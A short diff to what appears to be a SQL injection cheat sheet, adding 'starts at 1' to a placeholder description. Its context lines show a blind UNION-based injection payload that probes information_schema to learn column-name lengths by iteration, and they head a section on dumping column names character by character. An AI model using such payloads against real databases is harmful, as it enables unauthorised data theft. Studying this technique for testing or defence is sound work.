@@ -17,7 +17,7 @@
 - Dumping COLUMN LENGHTS:
 ' UNION SELECT 1 WHERE (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='{table_name}' LIMIT {position},1) = {NUMBER}-- -
 {table_name}: The table name you are targeting.
-{position} — Extracts a specific character of the table name.
+{position} — Extracts a specific character of the table name. starts at 1
 {number} - lenght of the column name, just keep iterating until the statement is True.
 
 - Dumping COLUMN NAMES character by character:
